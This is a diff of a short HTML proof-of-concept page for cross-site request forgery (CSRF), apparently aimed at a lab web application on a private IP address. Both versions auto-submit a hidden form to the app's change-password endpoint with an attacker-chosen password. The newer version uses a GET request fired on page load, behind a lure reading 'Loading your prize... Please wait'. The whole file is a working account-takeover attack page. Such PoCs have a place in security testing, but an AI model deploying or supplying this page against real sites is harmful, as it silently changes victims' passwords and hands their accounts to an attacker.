@@ -1,21 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CSRF PoC Demo</title>
-</head>
-<body>
+<body onload="document.forms[0].submit()">
  
 <h2>Loading your prize... Please wait</h2>
  
-<form id="csrfForm" action="http://192.168.4.137:3000/rest/user/change-password" method="POST">
-    <input type="hidden" name="new" value="NewPassword123">
-    <input type="hidden" name="repeat" value="NewPassword123">
+<form action="http://192.168.4.137:3000/rest/user/change-password" method="GET">
+    <input type="hidden" name="new" value="shiva@1234567">
+    <input type="hidden" name="repeat" value="shiva@1234567">
 </form>
- 
-<script>
-    // Auto-submit for demonstration
-    document.getElementById("csrfForm").submit();
-</script>
  
 </body>
 </html>
